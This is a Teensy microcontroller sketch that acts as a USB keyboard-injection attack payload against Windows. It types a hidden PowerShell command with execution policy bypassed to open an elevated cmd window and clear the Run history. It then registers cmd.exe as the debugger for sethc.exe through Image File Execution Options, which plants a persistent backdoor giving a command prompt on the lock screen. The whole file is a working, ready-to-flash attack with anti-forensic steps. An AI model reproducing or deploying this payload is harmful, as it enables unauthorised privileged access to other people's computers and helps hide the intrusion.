/*

Teensy ( https://www.pjrc.com/teensy/ )

Payload: windows-logon-cmd

Description: Opens a command prompt as administrator with run, adds a few registry entries and allows access to cmd on the lockscreen.

Press Right Alt + Right Shift + Print Screen to access cmd on the lockscreen.

Using US Keyboard Layout. Modify delays depending on the target machine. Tested Windows 7 and Windows 10.

Concept: https://github.com/hak5darren/USB-Rubber-Ducky/wiki/Attacking-Windows-At-The-Logon-Screen,---Gaining-Access-To-CMD-With-System-Privileges.

Created by Kleo Bercero - @kbeflo - kbeflo@gmail.com

*/

#include <paensy.h>

int ds = 500;

void setup() {

  // Configure the delay that everything else scales off of.
  SetDelay(200);
  // Configure the delay that the Morse code uses.
  SetMorseDelay(250);

  // Perform an initial delay to give the USB time to prepare.
  PerformInitDelay();

  // LED pin number, 13 for 3.1
  // 11 for 2 and 2.x
  SetLEDPin(13);
  // Put the pin into output mode
  pinMode(LED_PIN, OUTPUT);
  // Turn on the LED pin so we know the device is running.
  digitalWrite(LED_PIN, HIGH);
  delay(3000);
  // Run cmd as administrator on small window with white background, yellow text and clear run command history
  Keyboard.set_modifier(MODIFIERKEY_GUI);
  Keyboard.set_key1(KEY_R);
  Keyboard.send_now();
  Keyboard.set_modifier(0);
  Keyboard.set_key1(0);
  Keyboard.send_now();
  delay(500);
  Keyboard.print("powershell -NoP -NonI -W Hidden -Exec Bypass \"Start-Process cmd -A '/t:fe /k mode con lines=1 cols=18&reg delete HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU /va /f' -Verb runAs\"");
  Keyboard.set_key1(KEY_ENTER);
  Keyboard.send_now();
  Keyboard.set_modifier(0);
  Keyboard.set_key1(0);
  Keyboard.send_now();
  delay(3000);
  Keyboard.set_modifier(MODIFIERKEY_ALT);
  Keyboard.set_key1(KEY_Y);
  Keyboard.send_now();
  Keyboard.set_modifier(0);
  Keyboard.set_key1(0);
  Keyboard.send_now();
  delay(2000);
  Keyboard.print("cmd /c \"reg add \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe\" /v \"Debugger\" /t REG_SZ /d \"C:\\windows\\system32\\cmd.exe\" /f\"");
  Keyboard.set_key1(KEY_ENTER);
  Keyboard.send_now();
  Keyboard.set_modifier(0);
  Keyboard.set_key1(0);
  Keyboard.send_now();
  delay(500);
  Keyboard.print("exit");
  Keyboard.set_key1(KEY_ENTER);
  Keyboard.send_now();
  Keyboard.set_modifier(0);
  Keyboard.set_key1(0);
  Keyboard.send_now();

}

void loop()
{
  // blink quickly when complete
  digitalWrite(LED_PIN, HIGH);
  delay(ds/2);
  digitalWrite(LED_PIN, LOW);
  delay(ds/2);
}
